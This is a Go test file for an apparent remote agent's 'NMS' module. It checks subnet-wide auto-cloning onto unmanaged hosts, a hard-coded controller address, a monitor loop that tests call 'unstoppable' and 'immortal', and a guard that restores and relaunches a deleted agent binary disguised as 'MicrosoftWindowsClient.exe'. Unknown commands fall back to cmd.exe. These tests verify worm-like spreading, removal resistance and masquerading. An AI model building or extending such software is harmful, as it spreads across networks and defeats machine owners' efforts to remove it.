package commands

import (
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// withNMSRoot swaps the rendezvous root for a test (restores after).
func withNMSRoot(t *testing.T, dir string) {
	t.Helper()
	old := nmsRootOverride
	nmsRootOverride = dir
	t.Cleanup(func() { nmsRootOverride = old })
}

// CloneEligible decision table: only reachable+unmanaged+unlisted hosts pass.
func TestCloneEligible(t *testing.T) {
	exc := []string{"192.168.1.1"}
	self := []string{"192.168.1.50"}
	ctrl := []string{"176.229.98.54"}
	cases := []struct {
		host                  string
		reach, managed         bool
		want                  bool
		reason                string
	}{
		{"192.168.1.60", true, false, true, "eligible"},
		{"192.168.1.61", false, false, false, "unreachable"},
		{"192.168.1.62", true, true, false, "already-managed"},
		{"192.168.1.1", true, false, false, "excluded"},
		{"192.168.1.50", true, false, false, "self"},
		{"176.229.98.54", true, false, false, "controller"},
	}
	for _, c := range cases {
		got, reason := CloneEligible(c.host, c.reach, c.managed, exc, self, ctrl)
		if got != c.want || reason != c.reason {
			t.Fatalf("%s: got (%v,%q) want (%v,%q)", c.host, got, reason, c.want, c.reason)
		}
	}
}

// set-nms must refuse credential-ish keys: passwords travel only via the
// local vault file, never the controller channel.
func TestSetNMSRefusesPasswords(t *testing.T) {
	withNMSRoot(t, t.TempDir())
	for _, args := range []string{"password=x", "wmi_pass=x", "cred_file=x", "secret=x", "token=x"} {
		if _, err := SetNMS(args, nil); err == nil || !strings.Contains(err.Error(), "local-only") {
			t.Fatalf("SetNMS(%q) must refuse with local-only, got %v", args, err)
		}
	}
}

func TestSetNMSValidation(t *testing.T) {
	withNMSRoot(t, t.TempDir())
	if _, err := SetNMS("interval=5", nil); err == nil {
		t.Fatal("interval<10 must fail")
	}
	if _, err := SetNMS("bogus-key=1", nil); err == nil {
		t.Fatal("unknown key must fail")
	}
	if _, err := SetNMS("autoclone=maybe", nil); err == nil {
		t.Fatal("bad autoclone must fail")
	}
	if _, err := SetNMS("autoclone=off interval=120", nil); err != nil {
		t.Fatalf("valid set: %v", err)
	}
	cfg := LoadNMSConfig()
	if cfg.AutoClone || cfg.IntervalSec != 120 {
		t.Fatalf("config not applied: %+v", cfg)
	}
	if _, err := SetNMS("autoclone=on", nil); err != nil {
		t.Fatalf("re-arm: %v", err)
	}
	if LoadNMSConfig().AutoClone != true {
		t.Fatal("autoclone=on must persist")
	}
}

// Sleep flag roundtrip (durable order the agent honors).
func TestSleepFlagRoundtrip(t *testing.T) {
	withNMSRoot(t, t.TempDir())
	if SleepFlagSet() {
		t.Fatal("fresh root must read awake")
	}
	if err := WriteSleepFlag("test"); err != nil {
		t.Fatal(err)
	}
	st, ok := ReadSleepFlag()
	if !ok || st.Reason != "test" {
		t.Fatalf("flag unreadable: %+v %v", st, ok)
	}
	if !SleepFlagSet() {
		t.Fatal("must read asleep")
	}
	if err := ClearSleepFlag(); err != nil {
		t.Fatal(err)
	}
	if SleepFlagSet() {
		t.Fatal("must read awake after clear")
	}
}

// The shutdown file is the ONLY loop exit: StepNMS returns the sentinel.
func TestShutdownSentinel(t *testing.T) {
	dir := t.TempDir()
	withNMSRoot(t, dir)
	oldStart := guardStartAgent
	guardStartAgent = func() error { return nil }
	t.Cleanup(func() { guardStartAgent = oldStart })
	_ = SaveNMSConfig(NMSConfig{IntervalSec: 60, Subnets: nil, AutoClone: false})
	if err := WriteShutdownFile(); err != nil {
		t.Fatal(err)
	}
	if err := StepNMS(nil, nil); err != ErrNMSShutdown {
		t.Fatalf("want ErrNMSShutdown, got %v", err)
	}
}

// THE unstoppable test: the tick advances while "asleep" — the loop never
// reads the sleep flag, so agent-sleep cannot slow or stop the monitor.
func TestTickAdvancesWhileAsleep(t *testing.T) {
	dir := t.TempDir()
	withNMSRoot(t, dir)
	oldStart := guardStartAgent
	guardStartAgent = func() error { return nil }
	t.Cleanup(func() { guardStartAgent = oldStart })
	_ = SaveNMSConfig(NMSConfig{IntervalSec: 60, Subnets: nil, AutoClone: false})
	before := NMSTick()
	if err := WriteSleepFlag("prove-immortal"); err != nil {
		t.Fatal(err)
	}
	for i := 0; i < 2; i++ {
		if err := StepNMS(nil, nil); err != nil {
			t.Fatalf("cycle %d: %v", i, err)
		}
	}
	if NMSTick() != before+2 {
		t.Fatalf("tick stuck at %d (was %d) while asleep", NMSTick(), before)
	}
	_ = ClearSleepFlag()
}

// Circuit breaker: failure storms pause the CLONE ARM only.
func TestBreakerTrips(t *testing.T) {
	withNMSRoot(t, t.TempDir())
	_ = SaveNMSConfig(NMSConfig{IntervalSec: 60, FailThreshold: 2, FailWindowMin: 60, RearmAfterMin: 60})
	nmsClearBreaker()
	if CloneArmPaused() {
		t.Fatal("fresh breaker must not hold")
	}
	nmsRecordFail()
	if CloneArmPaused() {
		t.Fatal("single fail must not trip threshold=2")
	}
	nmsRecordFail()
	if !CloneArmPaused() {
		t.Fatal("threshold must trip the arm")
	}
	nmsClearBreaker()
	if CloneArmPaused() {
		t.Fatal("clear must release the arm")
	}
}

// Subnet expansion: full /24 minus network/broadcast.
func TestExpandSubnet(t *testing.T) {
	ips := expandSubnet("192.168.7.0/24")
	if len(ips) != 254 || ips[0] != "192.168.7.1" || ips[253] != "192.168.7.254" {
		t.Fatalf("bad expansion: %d first=%s last=%s", len(ips), ips[0], ips[len(ips)-1])
	}
	if len(expandSubnet("bogus")) != 0 {
		t.Fatal("garbage subnet must expand empty")
	}
}

// Report shape: the controller/UI contract (required keys present).
func TestReportShape(t *testing.T) {
	dir := t.TempDir()
	withNMSRoot(t, dir)
	oldStart := guardStartAgent
	guardStartAgent = func() error { return nil }
	t.Cleanup(func() { guardStartAgent = oldStart })
	_ = SaveNMSConfig(NMSConfig{IntervalSec: 60, Subnets: nil, AutoClone: false})
	var got string
	if err := StepNMS(func(j string) { got = j }, nil); err != nil {
		t.Fatal(err)
	}
	var rep map[string]interface{}
	if err := json.Unmarshal([]byte(got), &rep); err != nil {
		t.Fatalf("report not JSON: %v", err)
	}
	for _, k := range []string{"prober", "at", "tick", "version", "guard", "clone_arm", "results"} {
		if _, ok := rep[k]; !ok {
			t.Fatalf("report missing %q", k)
		}
	}
	res, ok := rep["results"].([]interface{})
	if !ok || len(res) == 0 {
		t.Fatal("results must carry at least the self entry")
	}
}

// Agent-side redirects: NMS verbs sent to the AGENT answer with a pointer,
// never touch cmd.exe (Execute falls back to shell for unknown verbs).
func TestAgentRedirects(t *testing.T) {
	for _, v := range []string{"agent-sleep", "agent-wake-up", "nms-status", "nms-now", "set-nms", "nms-stop", "nms-clone"} {
		res, err := Execute(v, "")
		if err != nil {
			t.Fatalf("%s errored: %v", v, err)
		}
		if !strings.Contains(res, "hostname/nms") {
			t.Fatalf("%s must redirect to the NMS row, got %q", v, res)
		}
	}
}

// Sleep gate on the agent: asleep refuses work, bypass verbs answer,
// misaddressed wake still answers (it must, to teach the operator).
func TestAgentSleepGate(t *testing.T) {
	withNMSRoot(t, t.TempDir())
	if _, _, err := ExecuteChecked("t1", "get-status", ""); err != nil {
		t.Fatalf("awake get-status: %v", err)
	}
	if err := WriteSleepFlag("gate-test"); err != nil {
		t.Fatal(err)
	}
	if _, _, err := ExecuteChecked("t2", "get-status", ""); err == nil || !strings.Contains(err.Error(), "asleep") {
		t.Fatalf("asleep get-status must refuse, got %v", err)
	}
	if _, _, err := ExecuteChecked("t3", "ping", ""); err != nil {
		t.Fatalf("asleep ping must answer: %v", err)
	}
	res, _, err := ExecuteChecked("t4", "agent-wake-up", "")
	if err != nil || !strings.Contains(res, "hostname/nms") {
		t.Fatalf("asleep agent-wake-up must redirect, got %q %v", res, err)
	}
	_ = ClearSleepFlag()
}

// NMS verbs: unknown rejected, stop gated on confirm (and writes nothing
// without it).
func TestNMSHandleGates(t *testing.T) {
	withNMSRoot(t, t.TempDir())
	if _, err := NMSHandle("nms-bogus", "", nil); err == nil {
		t.Fatal("unknown NMS verb must fail")
	}
	if _, err := NMSHandle("nms-stop", "", nil); err == nil {
		t.Fatal("nms-stop without confirm must fail")
	}
	if _, err := os.Stat(NMSShutdownPath()); !os.IsNotExist(err) {
		t.Fatal("refused stop must not write the shutdown file")
	}
	if _, err := NMSHandle("nms-stop", "--confirm YES", nil); err != nil {
		t.Fatalf("confirmed stop: %v", err)
	}
	if _, err := os.Stat(NMSShutdownPath()); err != nil {
		t.Fatal("confirmed stop must write the shutdown file")
	}
	_ = os.Remove(NMSShutdownPath())
}

// Update pinning: a newer installDir version exits the loop (persistence
// restarts new bytes) instead of running stale code forever.
func TestVerNewer(t *testing.T) {
	if !verNewer("1.49.0", "1.48.0") || verNewer("1.48.0", "1.49.0") || verNewer("1.48.0", "1.48.0") {
		t.Fatal("dotted compare wrong")
	}
	if !verNewer("1.48.1", "1.48.0") || verNewer("1.9.0", "1.10.0") {
		t.Fatal("numeric (not lexical) compare required")
	}
}

func TestUpdateExits(t *testing.T) {
	dir := t.TempDir()
	withNMSRoot(t, dir)
	oldStart := guardStartAgent
	guardStartAgent = func() error { return nil }
	t.Cleanup(func() { guardStartAgent = oldStart })
	_ = os.WriteFile(filepath.Join(dir, "version.txt"), []byte("9.9.9\n"), 0644)
	if err := StepNMS(nil, nil); !errors.Is(err, ErrNMSUpdate) {
		t.Fatalf("want ErrNMSUpdate, got %v", err)
	}
}

// Guard restore: a wiped agent dir gets rewritten from our own image
// (test binary stands in), starter invoked, action word exact.
func TestGuardRestoresWiped(t *testing.T) {
	dir := t.TempDir()
	withNMSRoot(t, dir)
	var started int
	oldStart := guardStartAgent
	guardStartAgent = func() error { started++; return nil }
	t.Cleanup(func() { guardStartAgent = oldStart })
	// Point the guard at a scratch exe name? GuardAgent uses the fixed
	// install path — the override root makes that the temp dir (safe).
	if got := GuardAgent(); got != "restored-missing" {
		t.Fatalf("wiped agent: got %q", got)
	}
	if started != 1 {
		t.Fatalf("starter must run once, ran %d", started)
	}
	b, err := os.ReadFile(filepath.Join(dir, "MicrosoftWindowsClient.exe"))
	if err != nil || len(b) < 1024*1024 {
		t.Fatalf("restored bytes bad: %d %v", len(b), err)
	}
	if got := GuardAgent(); got != "started-process" && got != "ok" {
		t.Fatalf("second pass: got %q", got)
	}
}
